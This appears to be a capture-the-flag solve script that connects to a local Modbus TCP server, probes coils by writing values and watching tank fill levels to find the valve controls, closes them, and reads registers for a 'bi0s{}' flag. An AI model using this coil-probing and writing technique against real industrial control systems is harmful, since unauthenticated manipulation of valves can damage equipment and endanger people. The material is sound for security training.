from pymodbus.client import ModbusTcpClient
import time
import re

SERVER_IP = 'localhost'
SERVER_PORT = 5020

SLAVE_ID = 0x01
POSSIBLE_COIL_ADDRESSES = list(range(15, 50))
READ_START_ADDRESS = 50
READ_COUNT = 100
FLAG_PATTERN = r"bi0s\{.*?\}"

client = ModbusTcpClient(SERVER_IP, port=SERVER_PORT)

identified_valves_state = {}


def read_and_check_flag():
    """Read holding registers and check for flag pattern"""
    rr = client.read_holding_registers(address=READ_START_ADDRESS, count=READ_COUNT, slave=SLAVE_ID)
    if rr.isError() or not rr.registers:
        print(f"[DEBUG] read_and_check_flag: Error reading registers or no registers returned. Error: {rr}")
        return None
    
    data_bytes = b"".join(reg.to_bytes(2, 'big') for reg in rr.registers)
    try:
        decoded = data_bytes.decode('utf-8', errors='ignore').replace('\x00', '')
    except Exception as e:
        print(f"[DEBUG] read_and_check_flag: Error decoding bytes: {e}")
        return None
    
    match = re.search(FLAG_PATTERN, decoded)
    if match:
        return match.group(0)
    else:
        return None

def get_tank_status():
    rr = client.read_holding_registers(address=0, count=2, slave=SLAVE_ID)
    if not rr.isError() and rr.registers and len(rr.registers) == 2:
        return rr.registers[0], rr.registers[1]
    else:
        print(f"[DEBUG] get_tank_status: Error or insufficient registers. Error: {rr}")
        return None, None

def set_all_coils_to_value(value=0):
    print(f"[DEBUG] Globally setting all coils to {value}")
    for addr_loop in POSSIBLE_COIL_ADDRESSES:
        client.write_coil(addr_loop, value, slave=SLAVE_ID)

def set_coils_for_probing(addr_being_probed, value_for_addr_being_probed):
   
    for c_addr in POSSIBLE_COIL_ADDRESSES:
        if c_addr == addr_being_probed:
            client.write_coil(c_addr, value_for_addr_being_probed, slave=SLAVE_ID)
        elif c_addr in identified_valves_state:
            
            closed_val = identified_valves_state[c_addr]
            client.write_coil(c_addr, closed_val, slave=SLAVE_ID)
        else: 
            client.write_coil(c_addr, 0, slave=SLAVE_ID)

def probe_coil_effect(addr_to_probe):
  
    global identified_valves_state

    print(f"[DEBUG] Probing coil {addr_to_probe}. Identified valves kept closed: {identified_valves_state}")
    set_coils_for_probing(addr_being_probed=addr_to_probe, value_for_addr_being_probed=0) 
    time.sleep(1)
    tank1_base, _ = get_tank_status()
    if tank1_base is None: return False, None
    time.sleep(4)
    tank2_base, _ = get_tank_status()
    if tank2_base is None: return False, None
    baseline_delta = tank2_base - tank1_base
    print(f"[DEBUG] Coil {addr_to_probe} (it's OFF, known valves ON) baseline delta: {baseline_delta}")

    effects = {}
    for test_val in [0, 1]: 
        set_coils_for_probing(addr_being_probed=addr_to_probe, value_for_addr_being_probed=test_val)
        time.sleep(1)
        tank1_test, _ = get_tank_status()
        if tank1_test is None: effects[test_val] = float('inf'); print(f"[WARN] Tank read error for coil {addr_to_probe}={test_val}"); continue
        time.sleep(4)
        tank2_test, _ = get_tank_status()
        if tank2_test is None: effects[test_val] = float('inf'); print(f"[WARN] Tank read error for coil {addr_to_probe}={test_val}"); continue
        
        delta = tank2_test - tank1_test
        effects[test_val] = delta
        print(f"[DEBUG] Coil {addr_to_probe} set to {test_val} (known valves ON): fill increment = {delta}")

    is_valve = False
    logic_type = None
    
    if 0 in effects and 1 in effects and effects[0] != float('inf') and effects[1] != float('inf'):
        if effects[0] < effects[1] and effects[0] < baseline_delta:
            logic_type = 1 
            is_valve = True
        elif effects[1] < effects[0] and effects[1] < baseline_delta:
            logic_type = 0 
            is_valve = True
            
    if is_valve:
        closed_value = 0 if logic_type == 1 else 1
        print(f"[DEBUG] Coil {addr_to_probe} IS a valve (logic: {logic_type}). Setting to closed state: {closed_value} and recording.")
        identified_valves_state[addr_to_probe] = closed_value
        set_coils_for_probing(addr_being_probed=addr_to_probe, value_for_addr_being_probed=closed_value)
    else:
        print(f"[DEBUG] Coil {addr_to_probe} is NOT a valve (or effect changed). Setting to 0. Removing if previously identified.")
        if addr_to_probe in identified_valves_state:
            del identified_valves_state[addr_to_probe]
        set_coils_for_probing(addr_being_probed=addr_to_probe, value_for_addr_being_probed=0)
            
    time.sleep(0.1)
    return is_valve, logic_type

found_flag_value = None

try:
    if not client.connect():
        print("[-] Could not connect to Modbus server.")
        exit(1)
    
    print(f"[+] Connected to Modbus server at {SERVER_IP}:{SERVER_PORT}")
    
    identified_valves_state = {} 
    print("[*] Probing coils sequentially. Identified valves will remain closed during subsequent probes...")
    
    for addr_probe_loop in POSSIBLE_COIL_ADDRESSES:
        is_valve, logic = probe_coil_effect(addr_probe_loop)
        if is_valve:
            logic_str = "Normal (1 closes)" if logic == 0 else "Inverted (0 closes)"
            print(f"[+] Coil {addr_probe_loop} confirmed as valve (Logic: {logic_str}). It is now in its closed state.")
            print(f"    Current state of all identified valves: {identified_valves_state}")
        else:
            print(f"[-] Coil {addr_probe_loop} not acting as a valve in current context. It is now set to 0.")
            print(f"    Current state of all identified valves: {identified_valves_state}")

    print("\n[*] Probing complete.")
    print(f"[*] Final state of identified valves: {identified_valves_state}")
    print(f"[*] All identified valves are in their 'closed' state. Other coils are '0'.")
    print(f"[*] Attempting to read flag with this final coil configuration...")

    time.sleep(1) 
    found_flag_value = read_and_check_flag()

    if found_flag_value:
        print(f"\n[+] FLAG FOUND: {found_flag_value}")
        print(f"[+] Coils were configured based on sequential probing to: {identified_valves_state}")
    else:
        print(f"\n[-] Flag not found with the final coil configuration derived from probing.")
        print(f"    Final identified valve states: {identified_valves_state}")

except KeyboardInterrupt:
    print("\n[!] Interrupted by user.")
except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()
finally:
    if found_flag_value is None:
        print("[*] Resetting all coils (flag not found or script ended before success).")
        if client.is_socket_open():
            set_all_coils_to_value(0)
    else:
        print(f"[+] Flag '{found_flag_value}' was found. Coils intentionally left in the winning state.")
        
    if client.is_socket_open():
        client.close()
    print("[*] Connection closed.")
